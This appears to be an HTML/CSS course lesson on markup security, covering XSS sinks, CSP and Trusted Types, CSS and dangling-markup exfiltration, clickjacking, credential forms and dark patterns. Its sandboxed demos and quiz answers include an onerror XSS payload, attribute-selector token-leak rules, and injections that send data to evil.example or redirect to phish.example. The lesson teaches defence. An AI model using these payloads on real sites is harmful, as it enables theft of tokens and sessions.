@@ -1,0 +1,161 @@
+---
+title: Security & Privacy at the Markup Layer
+source: L1-coding-html-css.md
+part: 25
+tier: Core → Deep
+summary: XSS contexts and sinks, defences (escaping, sanitising, Trusted Types, CSP), CSS injection and exfiltration, dangling markup and base/form hijacking, links and framing, forms and credentials, privacy in markup and styles, and trust signals versus dark patterns.
+anchors:
+  - "Any string that becomes markup is code. Escaping turns it back into text, and every place you skip escaping is a place you've decided the string is trusted."
+  - "CSS looks harmless, but with selectors and URLs it can read attributes and send them somewhere. User-controlled CSS is user-controlled code."
+checks:
+  - q: "List five XSS sinks in HTML/templating and the escaping or sanitisation each needs."
+    a: "(1) `element.innerHTML = x` / `insertAdjacentHTML` / `outerHTML`: use `textContent`, or sanitise with an allowlist and enforce Trusted Types. (2) A template's raw filter (`{{{ x }}}`, `| safe`, `dangerouslySetInnerHTML`, `v-html`): remove it or sanitise first. (3) `href`/`src` attributes: allow only http(s)/mailto/relative schemes, then HTML-escape. (4) Values inside `<script>`: serialise as JSON with `<` escaped, or use a data attribute. (5) `srcdoc` and `document.write`: treat as full HTML documents: sanitise, and sandbox the iframe. Inline event handlers built from strings (`onclick=\"…${x}…\"`) need JavaScript-string encoding on top of HTML escaping: better, never build them."
+  - q: "Explain how an attribute selector plus `background-image` can exfiltrate a CSRF token."
+    a: "If an attacker can inject CSS on a page containing `<input type=\"hidden\" name=\"csrf\" value=\"k3v9…\">`, they write one rule per possible first character: `input[name=csrf][value^=\"a\"] { background-image: url(https://evil.example/?c=a) }`, and so on. Only the matching rule's image is requested, leaking the first character; the next round (another injection, or an @import chain that serves generated CSS) leaks the second. Hidden inputs don't render backgrounds, so real attacks target a following sibling (`input[value^=a] + *`) or use `:has()`. Defence: never allow user-controlled CSS, and a CSP `style-src` without `unsafe-inline` plus a restrictive `img-src`."
+  - q: "Explain why uploaded SVGs should be served from a separate origin or sanitised."
+    a: "SVG is a document format: it can contain `<script>`, event handlers (`onload`), `<foreignObject>` with HTML, and links. If a user-uploaded `.svg` is served from your origin with `Content-Type: image/svg+xml` and someone opens it directly (not via `<img>`), its scripts run with your origin's privileges: cookies, same-origin APIs, your users' sessions. Serve uploads from a separate cookieless domain (e.g. usercontent.example), with `Content-Security-Policy: sandbox` and `Content-Disposition: attachment` where appropriate, or sanitise/rasterise SVGs on upload."
+  - q: "Explain reverse tabnabbing and why modern browsers changed the default."
+    a: "A page opened with `target=\"_blank\"` used to get `window.opener`, a reference back to the page that opened it. A malicious (or compromised) destination could run `window.opener.location = 'https://phish.example/login'`, silently replacing your tab with a fake login while the user looks at the new tab. Browsers now treat `target=\"_blank\"` as `rel=\"noopener\"` by default, so `opener` is null; `rel=\"opener\"` opts back in when you really need it."
+build: "A \"markup security\" lab: a deliberately vulnerable comment system demonstrating stored XSS, a CSS exfiltration proof of concept against a test page you own, a dangling-markup injection, and an SVG upload attack. Then fix each with escaping, sanitisation, CSP with nonces, and origin isolation, documenting what each control stops."
+steps:
+  - "Fork the guestbook from Part 22 and add a deliberately vulnerable `raw()` for comments: demonstrate stored XSS locally."
+  - "Add a user-CSS feature and demonstrate attribute-selector exfiltration against your own test page."
+  - "Demonstrate dangling markup with an unclosed `<img src='`."
+  - "Accept SVG uploads and show script execution when opened directly."
+  - "Fix each: remove raw, sanitise with an allowlist, CSP with nonces, a separate upload origin; document what each control stops."
+taste: "Treat escaping as the default and every exception as a code-review event. The most secure markup is boring: escaped by default, sanitised by allowlist, and never assembled from strings by hand."
+quiz:
+  - q: "Which is a safe way to insert user text into the DOM?"
+    options: ["`el.innerHTML = text`", "`el.textContent = text`", "`el.insertAdjacentHTML('beforeend', text)`"]
+    answer: 1
+    why: "textContent never parses markup."
+  - q: "What does `sandbox=\"allow-scripts allow-same-origin\"` do for same-origin content?"
+    options: ["Makes it safe", "Effectively nothing: the frame can remove its own sandbox", "Blocks scripts"]
+    answer: 1
+    why: "Same-origin scripts can reach the parent and the iframe element; use a different origin for untrusted content."
+  - q: "Which CSP directive stops your page being framed by other sites?"
+    options: ["`script-src`", "`frame-ancestors 'none'` (or 'self')", "`frame-src`"]
+    answer: 1
+    why: "frame-ancestors controls who may embed you; frame-src controls what you may embed."
+---
+
+import Try from '@learn/shared/components/Try.astro';
+import Playground from '@learn/shared/components/Playground.astro';
+
+## XSS through markup
+
+**Injection contexts**: element content, attribute values (quoted and unquoted), URLs, inline event handlers, `<script>` and `<style>` blocks. **Dangerous sinks**: `innerHTML`, `outerHTML`, `insertAdjacentHTML`, `document.write`, `srcdoc`, `dangerouslySetInnerHTML`, `v-html`, and template "raw" filters. **URL schemes**: `javascript:` and `data:` in `href` and `src`. **SVG uploads**: scripts and event handlers inside SVG served as `image/svg+xml` from your origin. (The escaping-by-context lab in Part 22 shows each context.)
+
+<Playground
+  id="p25-sinks"
+  title="The same comment through three sinks (runs in this sandbox only)"
+  task="Press each button. Only innerHTML and insertAdjacentHTML run the attacker's handler (see the console). Change the payload to a javascript: link and click it after inserting."
+  html={`<label>Comment <input id="c" value='Nice! <img src="" onerror="console.log(&apos;XSS ran with access to this page&apos;)">'></label>\n<p><button id="text">textContent</button> <button id="html">innerHTML</button> <button id="adj">insertAdjacentHTML</button></p>\n<div id="out" class="out"></div>`}
+  css={`label { display: grid; gap: .25rem; }\ninput { font: .9rem ui-monospace, monospace; padding: .3rem; }\n.out { min-height: 2rem; padding: .5rem; border: 1px dashed #aaa; }`}
+  js={`const c = document.getElementById('c'), out = document.getElementById('out');\ndocument.getElementById('text').onclick = () => { out.textContent = c.value; console.log('textContent: shown as text, nothing ran'); };\ndocument.getElementById('html').onclick = () => { out.innerHTML = c.value; };\ndocument.getElementById('adj').onclick = () => { out.replaceChildren(); out.insertAdjacentHTML('beforeend', c.value); };`}
+/>
+
+## Defences
+
+**Context-aware auto-escaping** (Part 22) by default; **allowlist sanitising** for the rare HTML you must accept; **Trusted Types** (a CSP mode that makes DOM sinks refuse plain strings, so every assignment goes through a reviewed policy); the **Sanitizer API** (`setHTML()`) **[Frontier]**; and a **Content Security Policy**. For your CSS, a strict CSP means **nonces** for `<style>` tags and avoiding inline `style` attributes (or accepting `'unsafe-hashes'`). And **serve user uploads from a separate origin**.
+
+<Playground
+  id="p25-trusted-types"
+  title="Trusted Types: sinks refuse strings unless a policy approves them"
+  task="The inner page has a CSP meta in its head requiring Trusted Types. Press Assign string: engines with Trusted Types block it. Press Assign via policy: the policy escapes first. Rewrite the policy to sanitise instead of escape."
+  html={`<p>A page whose <code>&lt;head&gt;</code> sends <code>require-trusted-types-for 'script'</code>:</p>\n<div id="host"></div>`}
+  css={`iframe { width: 100%; height: 9rem; border: 1px dashed #aaa; border-radius: .5rem; }`}
+  js={`// CSP must be in the document's <head>, so the demo runs in a nested page that has one.\nconst inner = () => {\n  const payload = '<b>bold</b> <img src="" onerror="alert(1)">';\n  const out = document.getElementById('out');\n  const log = (t) => (document.getElementById('log').textContent = t);\n  const policy = window.trustedTypes ? trustedTypes.createPolicy('comments', { createHTML: (s) => s.replace(/[&<>"']/g, (c) => '&#' + c.charCodeAt(0) + ';') }) : null;\n  document.getElementById('raw').onclick = () => {\n    try { out.innerHTML = payload; log(window.trustedTypes ? 'Assigned?!' : 'No Trusted Types here: the string went straight in'); }\n    catch (e) { log('Blocked: the sink refused a plain string'); }\n  };\n  document.getElementById('policy').onclick = () => { out.innerHTML = policy ? policy.createHTML(payload) : payload.replace(/</g, '&lt;'); log('Assigned through the reviewed policy (escaped)'); };\n};\nconst frame = document.createElement('iframe');\nframe.title = 'Page with Trusted Types enforced';\nframe.srcdoc = '<!doctype html><html><head><meta http-equiv="Content-Security-Policy" content="require-trusted-types-for \\'script\\'; trusted-types comments"></head>' +\n  '<body style="font:14px system-ui"><button id="raw">Assign string to innerHTML</button> <button id="policy">Assign via policy</button><p id="log"></p><div id="out"></div>' +\n  '<script>(' + inner.toString() + ')()</' + 'script></body></html>';\ndocument.getElementById('host').append(frame);`}
+/>
+
+```http
+Content-Security-Policy:
+  default-src 'self';
+  script-src 'nonce-r4nd0m' 'strict-dynamic';
+  style-src 'self' 'nonce-r4nd0m';
+  img-src 'self' https://images.example;
+  object-src 'none';
+  base-uri 'none';
+  form-action 'self';
+  frame-ancestors 'none';
+  require-trusted-types-for 'script';
+```
+
+## CSS injection and exfiltration
+
+With **attribute selectors** and **`background-image: url()`**, injected CSS can leak attribute values (CSRF tokens, input values) one character at a time: only the rule that matches fetches its image. `@import` chains and **`@font-face` with `unicode-range`** are further side channels (which characters appear on the page). The rule: **never allow user-controlled CSS** without strict sanitisation, and restrict `style-src` and `img-src` with CSP.
+
+<Playground
+  id="p25-css-exfil"
+  title="How injected CSS reads a token (simulated: no requests leave the sandbox)"
+  task="Press Run attack: CSS rules test the first character of the hidden token and the page reports which one matched. In a real attack each rule would load url(https://evil.example/?c=…). Extend the attack to the second character."
+  html={`<form><input type="hidden" name="csrf" value="k3v9x2"><span class="after-token">(a visible sibling the attacker can style)</span></form>\n<button id="run">Run attack</button>\n<p id="leak"></p>`}
+  css={`/* The attacker's injected CSS: one rule per candidate character.\n   Real attack: background-image: url(https://evil.example/leak?c=k); here we use a custom property. */\n${'abcdefghijklmnopqrstuvwxyz0123456789'.split('').map((ch) => 'input[name=csrf][value^="' + ch + '"] + .after-token { --leak: "' + ch + '"; }').join('\n')}`}
+  js={`document.getElementById('run').onclick = () => {\n  const leaked = getComputedStyle(document.querySelector('.after-token')).getPropertyValue('--leak').replace(/"/g, '');\n  document.getElementById('leak').textContent = 'The matching rule would have requested: https://evil.example/leak?c=' + leaked;\n};`}
+/>
+
+## Dangling markup, `<base>` hijacking and form actions
+
+**Dangling markup injection**: when you *can't* inject a script (strict CSP), an unclosed attribute still works: `<img src='https://evil.example/?` swallows everything up to the next matching quote (including a CSRF token or private text) into a URL the browser requests. **`<base href>` hijacking** re-points every relative URL; **form action hijacking** (an injected `<form action>` or `formaction`) sends user input elsewhere; `<meta http-equiv="refresh">` redirects. Defences: escape everything, CSP `base-uri 'none'` and `form-action 'self'`, and Chrome's block on newlines plus `<` in URLs.
+
+<Playground
+  id="p25-dangling"
+  title="See what an unclosed quote swallows (parsed, never loaded)"
+  task="Press Parse: DOMParser shows the img's src swallowing the token and the text after it. Close the quote in the injection and parse again."
+  html={`<label>Injected into the page <input id="inj" value="<img src='https://evil.example/log?data="></label>\n<button id="parse">Parse</button>\n<pre id="out"></pre>`}
+  css={`input { font: .85rem ui-monospace, monospace; width: 100%; }\npre { white-space: pre-wrap; background: #f4f1ee; padding: .5rem; }`}
+  js={`// The page template around the injection point, as the server would send it\nconst page = (inj) => '<p>Hello ' + inj + '</p>\\n<form><input type="hidden" name="csrf" value="k3v9x2"></form>\\n<p>Private note: account 4821</p>\\n<p class=\\'footer\\'>Thanks</p>';\ndocument.getElementById('parse').onclick = () => {\n  const doc = new DOMParser().parseFromString(page(document.getElementById('inj').value), 'text/html');\n  const img = doc.querySelector('img');\n  document.getElementById('out').textContent = img ? 'img src the browser would request:\\n' + img.getAttribute('src') : 'No dangling img: nothing swallowed';\n};`}
+/>
+
+## Links and framing
+
+`target="_blank"` now implies **`noopener`** (add it explicitly for old browsers; it prevents reverse tabnabbing). `rel="noreferrer"` for privacy and `referrerpolicy`. **iframe `sandbox`** tokens and the **`allow-scripts` + `allow-same-origin` trap**, `allow` for permissions, `credentialless` iframes. **Clickjacking**: an invisible frame of your site over a decoy button; defend with CSP **`frame-ancestors`** (and watch for UI-redress attacks built from transparent overlays in your own pages).
+
+<Playground
+  id="p25-clickjack"
+  title="Clickjacking: the button you see isn't the button you click"
+  task="Drag the opacity slider up to reveal the framed 'site' layered over the decoy. `frame-ancestors 'none'` on the real site would stop it being framed at all."
+  html={`<label>Frame opacity <input type="range" id="op" min="0" max="1" step="0.05" value="0"></label>\n<div class="stage">\n  <button class="decoy">Claim your free prize!</button>\n  <iframe id="victim" title="Framed bank page" srcdoc="<body style='margin:0;font:14px system-ui'><p style='margin:.5rem'>bank.example</p><button style='position:absolute;top:58px;left:20px;padding:10px 18px;background:#b91c1c;color:white;border:0;border-radius:6px'>Transfer ₹50,000</button></body>"></iframe>\n</div>`}
+  css={`.stage { position: relative; height: 9rem; margin-top: .5rem; }\n.decoy { position: absolute; top: 3.4rem; left: 1rem; padding: .7rem 1.2rem; font: 700 1rem system-ui; background: #15803d; color: white; border: 0; border-radius: .5rem; }\n#victim { position: absolute; inset: 0; width: 100%; height: 100%; border: 0; opacity: 0; }`}
+  js={`document.getElementById('op').oninput = (e) => (document.getElementById('victim').style.opacity = e.target.value);`}
+/>
+
+## Forms and credentials
+
+Help password managers: correct **`autocomplete`** (never disable it), `type="password"` with a **show-password toggle**, **passkey autofill** with `autocomplete="username webauthn"`. Never put secrets in hidden fields or URLs (they end up in logs, history and Referer headers). HTTPS forms only.
+
+<Playground
+  id="p25-credentials"
+  title="A sign-in form password managers and passkeys understand"
+  task="Toggle Show password (it's a button with aria-pressed, not a checkbox that submits). Note the autocomplete tokens, then add a 'Forgot password?' link that doesn't carry the email in its URL."
+  forms
+  html={`<form action="/login" method="post" class="login">\n  <label for="u">Email</label>\n  <input id="u" name="username" type="email" autocomplete="username webauthn" required>\n  <label for="p">Password</label>\n  <div class="pw"><input id="p" name="password" type="password" autocomplete="current-password" required><button type="button" id="show" aria-pressed="false" aria-controls="p">Show</button></div>\n  <button>Sign in</button>\n</form>`}
+  css={`.login { display: grid; gap: .35rem; max-width: 18rem; }\n.pw { display: flex; gap: .25rem; }\n.pw input { flex: 1; min-width: 0; }\ninput, button { font: inherit; padding: .35rem; }`}
+  js={`const show = document.getElementById('show'), pw = document.getElementById('p');\nshow.onclick = () => {\n  const on = show.getAttribute('aria-pressed') !== 'true';\n  show.setAttribute('aria-pressed', String(on));\n  show.textContent = on ? 'Hide' : 'Show';\n  pw.type = on ? 'text' : 'password';\n};\ndocument.querySelector('form').onsubmit = (e) => { e.preventDefault(); console.log('Would POST over HTTPS; the password never appears in the URL'); };`}
+/>
+
+## Privacy in markup and styles
+
+**`:visited` restrictions** stop history sniffing (only colours apply, and `getComputedStyle` lies). Third-party **fonts, images and embeds** leak visits: self-host and use **facades**. Tracking pixels. **`loading="lazy"`** is a privacy win for below-the-fold embeds. **Fingerprinting surfaces** (installed fonts, media queries). And **consent gating in markup**: don't load the script tag until consent.
+
+<Playground
+  id="p25-privacy"
+  title="A consent-gated analytics tag, and :visited lying on purpose"
+  task="Nothing third-party loads until you press Accept. Read the console: getComputedStyle reports the unvisited colour even for a visited link."
+  html={`<script type="text/plain" data-consent="analytics">console.log('Analytics loaded only after consent');</script>\n<div class="banner">We'd like to measure visits. <button id="accept">Accept</button> <button id="reject">Reject</button></div>\n<p><a href="about:srcdoc" id="v">A link to this very page (visited)</a></p>`}
+  css={`.banner { padding: .75rem; background: #1d1a19; color: white; border-radius: .5rem; }\na:visited { color: #7c3aed; }\na:link { color: #1d4ed8; }`}
+  js={`const activate = () => document.querySelectorAll('script[type="text/plain"][data-consent]').forEach((old) => {\n  const s = document.createElement('script');\n  s.textContent = old.textContent;\n  old.replaceWith(s);\n});\ndocument.getElementById('accept').onclick = () => { activate(); document.querySelector('.banner').remove(); };\ndocument.getElementById('reject').onclick = () => { document.querySelector('.banner').remove(); console.log('Rejected: nothing loaded'); };\nconsole.log('Computed colour of the visited link: ' + getComputedStyle(document.getElementById('v')).color + ' (the unvisited blue, by design)');`}
+/>
+
+## Trust signals and anti-phishing
+
+Never mimic browser chrome or system dialogs; make link destinations clear. And know the **dark-pattern** line: disguised ads, **confirmshaming**, **pre-ticked boxes**, roach motels (easy in, hard out), hidden costs. Legal frameworks increasingly regulate them (the EU DSA, US FTC guidance).
+
+<Playground
+  id="p25-dark-patterns"
+  title="A newsletter prompt with three dark patterns"
+  task="Find the confirmshaming, the pre-ticked box and the disguised dismiss. Redesign it honestly: neutral wording, unticked consent, an equally visible 'No thanks'."
+  html={`<div class="modal">\n  <h3>Get 10% off!</h3>\n  <label><input type="checkbox" checked> Also sign me up for partner offers</label>\n  <button class="yes">Yes, I want to save money</button>\n  <a href="#" class="no">No thanks, I prefer paying full price</a>\n</div>`}
+  css={`.modal { max-width: 20rem; padding: 1.25rem; border-radius: 1rem; background: #fff; box-shadow: 0 12px 32px rgb(0 0 0 / .2); display: grid; gap: .6rem; font-family: system-ui; }\n.modal h3 { margin: 0; }\n.yes { padding: .7rem; border: 0; border-radius: .5rem; background: #c2410c; color: white; font: 600 1rem system-ui; }\n.no { font-size: .7rem; color: #bbb; text-align: center; }`}
+  solution={{ html: `<div class="modal">\n  <h3>Get 10% off your first order</h3>\n  <p>We'll email one discount code and a monthly newsletter. Unsubscribe any time.</p>\n  <label><input type="checkbox"> Also send me partner offers</label>\n  <button class="yes">Subscribe</button>\n  <button class="no">No thanks</button>\n</div>`, css: `.modal { max-width: 20rem; padding: 1.25rem; border-radius: 1rem; background: #fff; box-shadow: 0 12px 32px rgb(0 0 0 / .2); display: grid; gap: .6rem; font-family: system-ui; }\n.modal h3, .modal p { margin: 0; }\n.yes, .no { padding: .7rem; border-radius: .5rem; font: 600 1rem system-ui; }\n.yes { border: 0; background: #c2410c; color: white; }\n.no { border: 1px solid #a8a29e; background: white; color: #1d1a19; }` }}
+/>
